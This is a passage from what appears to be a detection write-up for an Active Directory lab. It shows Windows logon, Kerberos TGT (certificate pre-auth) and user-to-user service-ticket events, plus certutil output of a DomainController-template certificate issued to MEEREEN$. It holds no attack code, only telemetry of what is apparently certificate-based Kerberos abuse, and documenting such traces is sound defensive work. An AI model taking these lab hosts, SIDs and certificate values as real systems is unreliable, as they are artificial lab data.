  <Data Name="SubjectDomainName">-</Data> 
  <Data Name="SubjectLogonId">0x0</Data> 
  <Data Name="TargetUserSid">S-1-5-21-666199682-1411342147-2938717855-1001</Data> 
  <Data Name="TargetUserName">MEEREEN$</Data> 
  <Data Name="TargetDomainName">ESSOS</Data> 
  <Data Name="TargetLogonId">0x19c7276</Data> 
  <Data Name="LogonType">3</Data> 
  <Data Name="LogonProcessName">Schannel</Data> 
  <Data Name="AuthenticationPackageName">Microsoft Unified Security Protocol Provider</Data> 
  <Data Name="WorkstationName">-</Data> 
  <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data> 
  <Data Name="TransmittedServices">-</Data> 
  <Data Name="LmPackageName">-</Data> 
  <Data Name="KeyLength">0</Data> 
  <Data Name="ProcessId">0x0</Data> 
  <Data Name="ProcessName">-</Data> 
  <Data Name="IpAddress">192.168.56.101</Data> 
  <Data Name="IpPort">60195</Data> 
  <Data Name="ImpersonationLevel">%%1833</Data> 
  <Data Name="RestrictedAdminMode">-</Data> 
  <Data Name="TargetOutboundUserName">-</Data> 
  <Data Name="TargetOutboundDomainName">-</Data> 
  <Data Name="VirtualAccount">%%1843</Data> 
  <Data Name="TargetLinkedLogonId">0x0</Data> 
  <Data Name="ElevatedToken">%%1842</Data> 
  </EventData>
  </Event>
```

### 4768 TGT Request

```
A Kerberos authentication ticket (TGT) was requested.

Account Information:
	Account Name:		MEEREEN$
	Supplied Realm Name:	ESSOS.LOCAL
	User ID:			ESSOS\MEEREEN$
	MSDS-SupportedEncryptionTypes:	0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)
	Available Keys:	AES-SHA1, RC4

Service Information:
	Service Name:		krbtgt
	Service ID:		ESSOS\krbtgt
	MSDS-SupportedEncryptionTypes:	0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)
	Available Keys:	AES-SHA1, RC4

Domain Controller Information:
	MSDS-SupportedEncryptionTypes:	0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)
	Available Keys:	AES-SHA1, RC4

Network Information:
	Client Address:		::ffff:192.168.56.101
	Client Port:		60883
	Advertized Etypes:	
		AES256-CTS-HMAC-SHA1-96
		AES128-CTS-HMAC-SHA1-96

Additional Information:
	Ticket Options:		0x40800010
	Result Code:		0x0
	Ticket Encryption Type:	0x12
	Session Encryption Type:	0x12
	Pre-Authentication Type:	16
	Pre-Authentication EncryptionType:	0x0

Certificate Information:
	Certificate Issuer Name:		ESSOS-CA
	Certificate Serial Number:	200000002123705E657E1E26D7000000000021
	Certificate Thumbprint:		45A0221D9526C06D5652B7303E52CADE4A4350E5

Ticket information
	Response ticket hash:		n/a
Certificate information is only provided if a certificate was used for pre-authentication.

Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4768</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>14339</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-30T20:22:05.731936500Z" /> 
  <EventRecordID>69715</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="580" ThreadID="2128" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="TargetUserName">MEEREEN$</Data> 
  <Data Name="TargetDomainName">ESSOS.LOCAL</Data> 
  <Data Name="TargetSid">S-1-5-21-666199682-1411342147-2938717855-1001</Data> 
  <Data Name="ServiceName">krbtgt</Data> 
  <Data Name="ServiceSid">S-1-5-21-666199682-1411342147-2938717855-502</Data> 
  <Data Name="TicketOptions">0x40800010</Data> 
  <Data Name="Status">0x0</Data> 
  <Data Name="TicketEncryptionType">0x12</Data> 
  <Data Name="PreAuthType">16</Data> 
  <Data Name="IpAddress">::ffff:192.168.56.101</Data> 
  <Data Name="IpPort">60883</Data> 
  <Data Name="CertIssuerName">ESSOS-CA</Data> 
  <Data Name="CertSerialNumber">200000002123705E657E1E26D7000000000021</Data> 
  <Data Name="CertThumbprint">45A0221D9526C06D5652B7303E52CADE4A4350E5</Data> 
  <Data Name="ResponseTicket">n/a</Data> 
  <Data Name="AccountSupportedEncryptionTypes">0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)</Data> 
  <Data Name="AccountAvailableKeys">AES-SHA1, RC4</Data> 
  <Data Name="ServiceSupportedEncryptionTypes">0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)</Data> 
  <Data Name="ServiceAvailableKeys">AES-SHA1, RC4</Data> 
  <Data Name="DCSupportedEncryptionTypes">0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)</Data> 
  <Data Name="DCAvailableKeys">AES-SHA1, RC4</Data> 
  <Data Name="ClientAdvertizedEncryptionTypes">AES256-CTS-HMAC-SHA1-96 AES128-CTS-HMAC-SHA1-96</Data> 
  <Data Name="SessionKeyEncryptionType">0x12</Data> 
  <Data Name="PreAuthEncryptionType">0x0</Data> 
  </EventData>
  </Event>
```

### 4769 TGT U2U Request


```
A Kerberos service ticket was requested.

Account Information:
	Account Name:		meereen$@ESSOS.LOCAL
	Account Domain:		ESSOS.LOCAL
	Logon GUID:		{655ecad8-5db2-9df7-8f80-0c05a956119d}
	MSDS-SupportedEncryptionTypes:	N/A
	Available Keys:	N/A

Service Information:
	Service Name:		MEEREEN$
	Service ID:		ESSOS\MEEREEN$
	MSDS-SupportedEncryptionTypes:	0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)
	Available Keys:	AES-SHA1, RC4

Domain Controller Information:
	MSDS-SupportedEncryptionTypes:	0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)
	Available Keys:	AES-SHA1, RC4

Network Information:
	Client Address:		::ffff:192.168.56.101
	Client Port:		60889
	Advertized Etypes:	
		AES256-CTS-HMAC-SHA1-96
		RC4-HMAC-NT

Additional Information:
	Ticket Options:		0x40810018
	Ticket Encryption Type:	0x12
	Session Encryption Type:	0x12
	Failure Code:		0x0
	Transited Services:	-

Ticket information
	Request ticket hash:		N/A	Response ticket hash:		N/A
This event is generated every time access is requested to a resource such as a computer or a Windows service.  The service name indicates the resource to which access was requested.

This event can be correlated with Windows logon events by comparing the Logon GUID fields in each event.  The logon event occurs on the machine that was accessed, which is often a different machine than the domain controller which issued the service ticket.

Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4769</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>14337</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-30T20:22:07.934147000Z" /> 
  <EventRecordID>69716</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="580" ThreadID="2128" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="TargetUserName">meereen$@ESSOS.LOCAL</Data> 
  <Data Name="TargetDomainName">ESSOS.LOCAL</Data> 
  <Data Name="ServiceName">MEEREEN$</Data> 
  <Data Name="ServiceSid">S-1-5-21-666199682-1411342147-2938717855-1001</Data> 
  <Data Name="TicketOptions">0x40810018</Data> 
  <Data Name="TicketEncryptionType">0x12</Data> 
  <Data Name="IpAddress">::ffff:192.168.56.101</Data> 
  <Data Name="IpPort">60889</Data> 
  <Data Name="Status">0x0</Data> 
  <Data Name="LogonGuid">{655ECAD8-5DB2-9DF7-8F80-0C05A956119D}</Data> 
  <Data Name="TransmittedServices">-</Data> 
  <Data Name="RequestTicketHash">N/A</Data> 
  <Data Name="ResponseTicketHash">N/A</Data> 
  <Data Name="AccountSupportedEncryptionTypes">N/A</Data> 
  <Data Name="AccountAvailableKeys">N/A</Data> 
  <Data Name="ServiceSupportedEncryptionTypes">0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)</Data> 
  <Data Name="ServiceAvailableKeys">AES-SHA1, RC4</Data> 
  <Data Name="DCSupportedEncryptionTypes">0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)</Data> 
  <Data Name="DCAvailableKeys">AES-SHA1, RC4</Data> 
  <Data Name="ClientAdvertizedEncryptionTypes">AES256-CTS-HMAC-SHA1-96 RC4-HMAC-NT</Data> 
  <Data Name="SessionKeyEncryptionType">0x12</Data> 
  </EventData>
  </Event>
```

### certutil output

<details>
<summary>Output of certuril tool</summary>

```
certutil.exe -v -view -restrict "RequestID=33" -gmt -out Request.RequestID,Request.RawRequest,Request.RawArchivedKey,Request.KeyRecoveryHashes,Request.RawOldCertificate,Request.RequestAttributes,Request.RequestType,Request.RequestFlags,Request.StatusCode,Request.Disposition,Request.DispositionMessage,Request.SubmittedWhen,Request.ResolvedWhen,Request.RevokedWhen,Request.RevokedEffectiveWhen,Request.RevokedReason,Request.RequesterName,Request.CallerName,Request.SignerPolicies,Request.SignerApplicationPolicies,Request.Officer,Request.DistinguishedName,Request.RawName,Request.Country,Request.Organization,Request.OrgUnit,Request.CommonName,Request.Locality,Request.State,Request.Title,Request.GivenName,Request.Initials,Request.SurName,Request.DomainComponent,Request.EMail,Request.StreetAddress,Request.UnstructuredName,Request.UnstructuredAddress,Request.DeviceSerialNumber,Request.AttestationChallenge,Request.EndorsementKeyHash,Request.EndorsementCertificateHash,Request.RawPrecertificate,RequestID,RawCertificate,CertificateHash,CertificateTemplate,EnrollmentFlags,GeneralFlags,PrivatekeyFlags,SerialNumber,IssuerNameID,NotBefore,NotAfter,SubjectKeyIdentifier,RawPublicKey,PublicKeyLength,PublicKeyAlgorithm,RawPublicKeyAlgorithmParameters,PublishExpiredCertInCRL,UPN,DistinguishedName,RawName,Country,Organization,OrgUnit,CommonName,Locality,State,Title,GivenName,Initials,SurName,DomainComponent,EMail,StreetAddress,UnstructuredName,UnstructuredAddress,DeviceSerialNumber
Schema:
  Column Name                   Localized Name                Type    MaxLength
  ----------------------------  ----------------------------  ------  ---------
  Request.RequestID             Request ID                    Long    4 -- Indexed
  Request.RawRequest            Binary Request                Binary  65536
  Request.RawArchivedKey        Archived Key                  Binary  65536
  Request.KeyRecoveryHashes     Key Recovery Agent Hashes     String  8192
  Request.RawOldCertificate     Old Certificate               Binary  16384
  Request.RequestAttributes     Request Attributes            String  32768
  Request.RequestType           Request Type                  Long    4
  Request.RequestFlags          Request Flags                 Long    4
  Request.StatusCode            Request Status Code           Long    4
  Request.Disposition           Request Disposition           Long    4 -- Indexed
  Request.DispositionMessage    Request Disposition Message   String  8192
  Request.SubmittedWhen         Request Submission Date       Date    8 -- Indexed
  Request.ResolvedWhen          Request Resolution Date       Date    8 -- Indexed
  Request.RevokedWhen           Revocation Date               Date    8
  Request.RevokedEffectiveWhen  Effective Revocation Date     Date    8 -- Indexed
  Request.RevokedReason         Revocation Reason             Long    4
  Request.RequesterName         Requester Name                String  2048 -- Indexed
  Request.CallerName            Caller Name                   String  2048 -- Indexed
  Request.SignerPolicies        Signer Policies               String  8192
  Request.SignerApplicationPolicies  Signer Application Policies   String  8192
  Request.Officer               Officer                       Long    4
  Request.DistinguishedName     Request Distinguished Name    String  8192
  Request.RawName               Request Binary Name           Binary  4096
  Request.Country               Request Country/Region        String  8192
  Request.Organization          Request Organization          String  8192
  Request.OrgUnit               Request Organization Unit     String  8192
  Request.CommonName            Request Common Name           String  8192
  Request.Locality              Request City                  String  8192
  Request.State                 Request State                 String  8192
  Request.Title                 Request Title                 String  8192
  Request.GivenName             Request First Name            String  8192
  Request.Initials              Request Initials              String  8192
  Request.SurName               Request Last Name             String  8192
  Request.DomainComponent       Request Domain Component      String  8192
  Request.EMail                 Request Email Address         String  8192
  Request.StreetAddress         Request Street Address        String  8192
  Request.UnstructuredName      Request Unstructured Name     String  8192
  Request.UnstructuredAddress   Request Unstructured Address  String  8192
  Request.DeviceSerialNumber    Request Device Serial Number  String  8192
  Request.AttestationChallenge  Attestation Challenge         Binary  4096
  Request.EndorsementKeyHash    Endorsement Key Hash          String  144 -- Indexed
  Request.EndorsementCertificateHash  Endorsement Certificate Hash  String  144 -- Indexed
  Request.RawPrecertificate     Binary Precertificate         Binary  16384
  RequestID                     Issued Request ID             Long    4 -- Indexed
  RawCertificate                Binary Certificate            Binary  16384
  CertificateHash               Certificate Hash              String  128 -- Indexed
  CertificateTemplate           Certificate Template          String  254 -- Indexed
  EnrollmentFlags               Template Enrollment Flags     Long    4
  GeneralFlags                  Template General Flags        Long    4
  PrivatekeyFlags               Template Private Key Flags    Long    4
  SerialNumber                  Serial Number                 String  128 -- Indexed
  IssuerNameID                  Issuer Name ID                Long    4
  NotBefore                     Certificate Effective Date    Date    8
  NotAfter                      Certificate Expiration Date   Date    8 -- Indexed
  SubjectKeyIdentifier          Issued Subject Key Identifier  String  128 -- Indexed
  RawPublicKey                  Binary Public Key             Binary  4096
  PublicKeyLength               Public Key Length             Long    4
  PublicKeyAlgorithm            Public Key Algorithm          String  254
  RawPublicKeyAlgorithmParameters  Public Key Algorithm Parameters  Binary  4096
  PublishExpiredCertInCRL       Publish Expired Certificate in CRL  Long    4
  UPN                           User Principal Name           String  2048 -- Indexed
  DistinguishedName             Issued Distinguished Name     String  8192
  RawName                       Issued Binary Name            Binary  4096
  Country                       Issued Country/Region         String  8192
  Organization                  Issued Organization           String  8192
  OrgUnit                       Issued Organization Unit      String  8192
  CommonName                    Issued Common Name            String  8192 -- Indexed
  Locality                      Issued City                   String  8192
  State                         Issued State                  String  8192
  Title                         Issued Title                  String  8192
  GivenName                     Issued First Name             String  8192
  Initials                      Issued Initials               String  8192
  SurName                       Issued Last Name              String  8192
  DomainComponent               Issued Domain Component       String  8192
  EMail                         Issued Email Address          String  8192
  StreetAddress                 Issued Street Address         String  8192
  UnstructuredName              Issued Unstructured Name      String  8192
  UnstructuredAddress           Issued Unstructured Address   String  8192
  DeviceSerialNumber            Issued Device Serial Number   String  8192

Row 1:
  Request ID: 0x21 (33)
  Binary Request:
-----BEGIN NEW CERTIFICATE REQUEST-----
MIICWDCCAUACAQAwEzERMA8GA1UEAwwITWVlcmVlbiQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQCUda2rjZpE6lczDmSzqYRlJja4PVx6xxpCAYS8pFuc
YKtIl83NTGFUbWu6Y3nPbBXE5McBoPbbMb299w6chtYMxccDzM3fAsJyhqAn96mH
c1zpXcV/eNVjH4+m9rMzUlk8s9BF8syJhcbi9MsswcymhNr9yxP3ftZ5iOnvMfKT
jFbZwrl/Mhe+g3vJYF2+EDVvd7LrrTGwvdOXEzyCxpbjj1nSYSwA2gnfF5BqhVOl
br08tWNpteNusHoq2AXnNT0eo1n73bhjX4jk7HfGTOKu17GT4p1XB4oRUbSH8goo
n1af1tGTmI4QC6snYoFQpNfm/omijtHa2K0lCwGF/y7TAgMBAAGgADANBgkqhkiG
9w0BAQsFAAOCAQEAeGgRZw4niMDqsoh7KbLYrIZPbD++LebUJ70X2S3z1Cg7Gg6G
n0wE11+fb8EUav1GGSPnkwbGOCAO7zvRiBn1JL+8YSOAi7aaiAr1bQhBGtgtpmjf
c4Kx7WmPRaBRh5GZ2jbkh52dV3Z1JdSM/X0TPDbc4Ua8eRL0ErJMQSRkAnh2GPOC
XGEAkM/d9KgoOSbUq16CWT3j57YsWvj39c4cDovPr/VnQnZkx73Spcwz4mpOI5WX
t1Fk6zMrA+6nTU+uHWA2lDMRrw4OLHmHh2MpTllJawd4/EimO/cc0AuBpBxVmdQx
wRlLnfyaHNzMGGgvqsD0iemkLKCL/YxXKCotyA==
-----END NEW CERTIFICATE REQUEST-----

PKCS10 Certificate Request:
Version: 1
Subject:
    CN=Meereen$
  Name Hash(sha1): 096c310b0b99fef5e3e9a4069bb08d7e2f1ae3f7
  Name Hash(md5): dffbece34248276fef92da3df2cd76e0

Public Key Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.1 RSA (RSA_SIGN)
    Algorithm Parameters:
    05 00
Public Key Length: 2048 bits
Public Key: UnusedBits = 0
    0000  30 82 01 0a 02 82 01 01  00 94 75 ad ab 8d 9a 44
    0010  ea 57 33 0e 64 b3 a9 84  65 26 36 b8 3d 5c 7a c7
    0020  1a 42 01 84 bc a4 5b 9c  60 ab 48 97 cd cd 4c 61
    0030  54 6d 6b ba 63 79 cf 6c  15 c4 e4 c7 01 a0 f6 db
    0040  31 bd bd f7 0e 9c 86 d6  0c c5 c7 03 cc cd df 02
    0050  c2 72 86 a0 27 f7 a9 87  73 5c e9 5d c5 7f 78 d5
    0060  63 1f 8f a6 f6 b3 33 52  59 3c b3 d0 45 f2 cc 89
    0070  85 c6 e2 f4 cb 2c c1 cc  a6 84 da fd cb 13 f7 7e
    0080  d6 79 88 e9 ef 31 f2 93  8c 56 d9 c2 b9 7f 32 17
    0090  be 83 7b c9 60 5d be 10  35 6f 77 b2 eb ad 31 b0
    00a0  bd d3 97 13 3c 82 c6 96  e3 8f 59 d2 61 2c 00 da
    00b0  09 df 17 90 6a 85 53 a5  6e bd 3c b5 63 69 b5 e3
    00c0  6e b0 7a 2a d8 05 e7 35  3d 1e a3 59 fb dd b8 63
    00d0  5f 88 e4 ec 77 c6 4c e2  ae d7 b1 93 e2 9d 57 07
    00e0  8a 11 51 b4 87 f2 0a 28  9f 56 9f d6 d1 93 98 8e
    00f0  10 0b ab 27 62 81 50 a4  d7 e6 fe 89 a2 8e d1 da
    0100  d8 ad 25 0b 01 85 ff 2e  d3 02 03 01 00 01
Request Attributes: 0
  0 attributes:
Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Signature: UnusedBits=0
    0000  c8 2d 2a 28 57 8c fd 8b  a0 2c a4 e9 89 f4 c0 aa
    0010  2f 68 18 cc dc 1c 9a fc  9d 4b 19 c1 31 d4 99 55
    0020  1c a4 81 0b d0 1c f7 3b  a6 48 fc 78 07 6b 49 59
    0030  4e 29 63 87 87 79 2c 0e  0e af 11 33 94 36 60 1d
    0040  ae 4f 4d a7 ee 03 2b 33  eb 64 51 b7 97 95 23 4e
    0050  6a e2 33 cc a5 d2 bd c7  64 76 42 67 f5 af cf 8b
    0060  0e 1c ce f5 f7 f8 5a 2c  b6 e7 e3 3d 59 82 5e ab
    0070  d4 26 39 28 a8 f4 dd cf  90 00 61 5c 82 f3 18 76
    0080  78 02 64 24 41 4c b2 12  f4 12 79 bc 46 e1 dc 36
    0090  3c 13 7d fd 8c d4 25 75  76 57 9d 9d 87 e4 36 da
    00a0  99 91 87 51 a0 45 8f 69  ed b1 82 73 df 68 a6 2d
    00b0  d8 1a 41 08 6d f5 0a 88  9a b6 8b 80 23 61 bc bf
    00c0  24 f5 19 88 d1 3b ef 0e  20 38 c6 06 93 e7 23 19
    00d0  46 fd 6a 14 c1 6f 9f 5f  d7 04 4c 9f 86 0e 1a 3b
    00e0  28 d4 f3 2d d9 17 bd 27  d4 e6 2d be 3f 6c 4f 86
    00f0  ac d8 b2 29 7b 88 b2 ea  c0 88 27 0e 67 11 68 78
Signature matches Public Key
Key Id Hash(rfc-sha1): b2d5e7ef4672bcb5dab7a57cbb83581ca163360c
Key Id Hash(sha1): bb834062b1105ab284311678eb5c4d0df15b5b0a
Key Id Hash(bcrypt-sha1): 2236feb913ac946636698e31a5e71d0dd2bbe36f
Key Id Hash(bcrypt-sha256): 6b6f48ffbe67a0bc4b245fd98a17fbfd663c624cc721dc727267a27806227eb5

  Archived Key: EMPTY
  Key Recovery Agent Hashes: EMPTY
  Old Certificate: EMPTY
  Request Attributes: "CertificateTemplate:DomainController"
0000    43 00 65 00 72 00 74 00  69 00 66 00 69 00 63 00   C.e.r.t.i.f.i.c.
0010    61 00 74 00 65 00 54 00  65 00 6d 00 70 00 6c 00   a.t.e.T.e.m.p.l.
0020    61 00 74 00 65 00 3a 00  44 00 6f 00 6d 00 61 00   a.t.e.:.D.o.m.a.
0030    69 00 6e 00 43 00 6f 00  6e 00 74 00 72 00 6f 00   i.n.C.o.n.t.r.o.
0040    6c 00 6c 00 65 00 72 00                            l.l.e.r.

  Request Type: 0x100 (256) -- PKCS10
  Request Flags: 0x4 -- Force UTF-8
  Request Status Code: 0x0 (WIN32: 0) -- The operation completed successfully.
  Request Disposition: 0x14 (20) -- Issued
  Request Disposition Message: "Issued"
0000    49 00 73 00 73 00 75 00  65 00 64 00               I.s.s.u.e.d.

  Request Submission Date: 7/30/2025 7:24 PM GMT
  Request Resolution Date: 7/30/2025 7:24 PM GMT
  Revocation Date: EMPTY
  Effective Revocation Date: EMPTY
  Revocation Reason: EMPTY
  Requester Name: "ESSOS\MEEREEN$"
0000    45 00 53 00 53 00 4f 00  53 00 5c 00 4d 00 45 00   E.S.S.O.S.\.M.E.
0010    45 00 52 00 45 00 45 00  4e 00 24 00               E.R.E.E.N.$.

  Caller Name: "ESSOS\MEEREEN$"
0000    45 00 53 00 53 00 4f 00  53 00 5c 00 4d 00 45 00   E.S.S.O.S.\.M.E.
0010    45 00 52 00 45 00 45 00  4e 00 24 00               E.R.E.E.N.$.

  Signer Policies: EMPTY
  Signer Application Policies: EMPTY
  Officer: EMPTY
  Request Distinguished Name: "CN=Meereen$"
0000    43 00 4e 00 3d 00 4d 00  65 00 65 00 72 00 65 00   C.N.=.M.e.e.r.e.
0010    65 00 6e 00 24 00                                  e.n.$.

  Request Binary Name:
0000    30 13 31 11 30 0f 06 03  55 04 03 0c 08 4d 65 65   0.1.0...U....Mee
0010    72 65 65 6e 24                                     reen$

  Request Country/Region: EMPTY
  Request Organization: EMPTY
  Request Organization Unit: EMPTY
  Request Common Name: "Meereen$"
0000    4d 00 65 00 65 00 72 00  65 00 65 00 6e 00 24 00   M.e.e.r.e.e.n.$.

  Request City: EMPTY
  Request State: EMPTY
  Request Title: EMPTY
  Request First Name: EMPTY
  Request Initials: EMPTY
  Request Last Name: EMPTY
  Request Domain Component: EMPTY
  Request Email Address: EMPTY
  Request Street Address: EMPTY
  Request Unstructured Name: EMPTY
  Request Unstructured Address: EMPTY
  Request Device Serial Number: EMPTY
  Attestation Challenge: EMPTY
  Endorsement Key Hash: EMPTY
  Endorsement Certificate Hash: EMPTY
  Binary Precertificate: EMPTY
  Issued Request ID: 0x21 (33)
  Binary Certificate:
-----BEGIN CERTIFICATE-----
MIIF7zCCBNegAwIBAgITIAAAACEjcF5lfh4m1wAAAAAAITANBgkqhkiG9w0BAQsF
ADBBMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVlc3Nv
czERMA8GA1UEAxMIRVNTT1MtQ0EwHhcNMjUwNzMwMTkxNDAwWhcNMjYwNzMwMTkx
NDAwWjAeMRwwGgYDVQQDExNtZWVyZWVuLmVzc29zLmxvY2FsMIIBIjANBgkqhkiG
9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlHWtq42aROpXMw5ks6mEZSY2uD1cescaQgGE
vKRbnGCrSJfNzUxhVG1rumN5z2wVxOTHAaD22zG9vfcOnIbWDMXHA8zN3wLCcoag
J/eph3Nc6V3Ff3jVYx+PpvazM1JZPLPQRfLMiYXG4vTLLMHMpoTa/csT937WeYjp
7zHyk4xW2cK5fzIXvoN7yWBdvhA1b3ey660xsL3TlxM8gsaW449Z0mEsANoJ3xeQ
aoVTpW69PLVjabXjbrB6KtgF5zU9HqNZ+924Y1+I5Ox3xkzirtexk+KdVweKEVG0
h/IKKJ9Wn9bRk5iOEAurJ2KBUKTX5v6Joo7R2titJQsBhf8u0wIDAQABo4IDATCC
Av0wHQYDVR0OBBYEFLLV5+9Gcry12relfLuDWByhYzYMMB8GA1UdIwQYMBaAFH1O
xx0zPzrvGpAOj09wpx5kq5TxMIHGBgNVHR8Egb4wgbswgbiggbWggbKGga9sZGFw
Oi8vL0NOPUVTU09TLUNBLENOPWJyYWF2b3MsQ049Q0RQLENOPVB1YmxpYyUyMEtl
eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZXNz
b3MsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG6BggrBgEFBQcBAQSBrTCBqjCB
pwYIKwYBBQUHMAKGgZpsZGFwOi8vL0NOPUVTU09TLUNBLENOPUFJQSxDTj1QdWJs
aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
LERDPWVzc29zLERDPWxvY2FsP2NBQ2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFz
cz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MC8GCSsGAQQBgjcUAgQiHiAARABvAG0A
YQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0l
BBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMBMD8GA1UdEQQ4MDagHwYJKwYBBAGCNxkB
oBIEEFls0Vn+fy5CvpBg+q1KYZSCE21lZXJlZW4uZXNzb3MubG9jYWwwTgYJKwYB
BAGCNxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTY2NjE5OTY4Mi0x
NDExMzQyMTQ3LTI5Mzg3MTc4NTUtMTAwMTBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqG
SIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcw
DQYJKoZIhvcNAQELBQADggEBABFwUufOl09VwpWF23LSS87hvlcyzVfToJM7eTjL
dbka8V3IeAnCtQyZ4dmIecqZgxX9H/V5AZdEbz2b5U0hCF/x3QcLnSLsmaDqmwoN
FJ94HuFqHFli8Jf3fO9ufnp97P7R2LR8I9BzeuvkdIl8ZMq/A5ZCybw/i3Fv2xWB
WELgDLmV3kwIHKPq9oEaVnXJHDjr4aH1Czk/HYHYCTiwnP5N3LKGEJTcZsHcP5/u
g9jT785cuMPkEWB90l/x9vdzmSnBMSkySuWa/b2f8LDYbmYWuYhZfjitVL2vD7kI
Fk/zyyRzUgyuoxCsGSZLJENZUg3UbLlKi1aAkZJYylJxDIM=
-----END CERTIFICATE-----

X509 Certificate:
Version: 3
Serial Number: 200000002123705e657e1e26d7000000000021
Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Issuer:
    CN=ESSOS-CA
    DC=essos
    DC=local
  Name Hash(sha1): c555fa55fe8e3e84d965d463e888a73d1877edbc
  Name Hash(md5): 26df41790381580445365a074ae47bac

 NotBefore: 7/30/2025 7:14 PM GMT
 NotAfter: 7/30/2026 7:14 PM GMT

Subject:
    CN=meereen.essos.local
  Name Hash(sha1): f5ee86dadcdca8c420a0856d643df230cbde7fc5
  Name Hash(md5): 0bee38ac2e8f8d9f46c027476f998af8

Public Key Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.1 RSA
    Algorithm Parameters:
    05 00
Public Key Length: 2048 bits
Public Key: UnusedBits = 0
    0000  30 82 01 0a 02 82 01 01  00 94 75 ad ab 8d 9a 44
    0010  ea 57 33 0e 64 b3 a9 84  65 26 36 b8 3d 5c 7a c7
    0020  1a 42 01 84 bc a4 5b 9c  60 ab 48 97 cd cd 4c 61
    0030  54 6d 6b ba 63 79 cf 6c  15 c4 e4 c7 01 a0 f6 db
    0040  31 bd bd f7 0e 9c 86 d6  0c c5 c7 03 cc cd df 02
    0050  c2 72 86 a0 27 f7 a9 87  73 5c e9 5d c5 7f 78 d5
    0060  63 1f 8f a6 f6 b3 33 52  59 3c b3 d0 45 f2 cc 89
    0070  85 c6 e2 f4 cb 2c c1 cc  a6 84 da fd cb 13 f7 7e
    0080  d6 79 88 e9 ef 31 f2 93  8c 56 d9 c2 b9 7f 32 17
    0090  be 83 7b c9 60 5d be 10  35 6f 77 b2 eb ad 31 b0
    00a0  bd d3 97 13 3c 82 c6 96  e3 8f 59 d2 61 2c 00 da
    00b0  09 df 17 90 6a 85 53 a5  6e bd 3c b5 63 69 b5 e3
    00c0  6e b0 7a 2a d8 05 e7 35  3d 1e a3 59 fb dd b8 63
    00d0  5f 88 e4 ec 77 c6 4c e2  ae d7 b1 93 e2 9d 57 07
    00e0  8a 11 51 b4 87 f2 0a 28  9f 56 9f d6 d1 93 98 8e
    00f0  10 0b ab 27 62 81 50 a4  d7 e6 fe 89 a2 8e d1 da
    0100  d8 ad 25 0b 01 85 ff 2e  d3 02 03 01 00 01
Certificate Extensions: 10
    2.5.29.14: Flags = 0, Length = 16
    Subject Key Identifier
        b2d5e7ef4672bcb5dab7a57cbb83581ca163360c

    2.5.29.35: Flags = 0, Length = 18
    Authority Key Identifier
        KeyID=7d4ec71d333f3aef1a900e8f4f70a71e64ab94f1

    2.5.29.31: Flags = 0, Length = be
    CRL Distribution Points
        [1]CRL Distribution Point
             Distribution Point Name:
                  Full Name:
                       URL=ldap:///CN=ESSOS-CA,CN=braavos,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint (ldap:///CN=ESSOS-CA,CN=braavos,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=essos,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint)

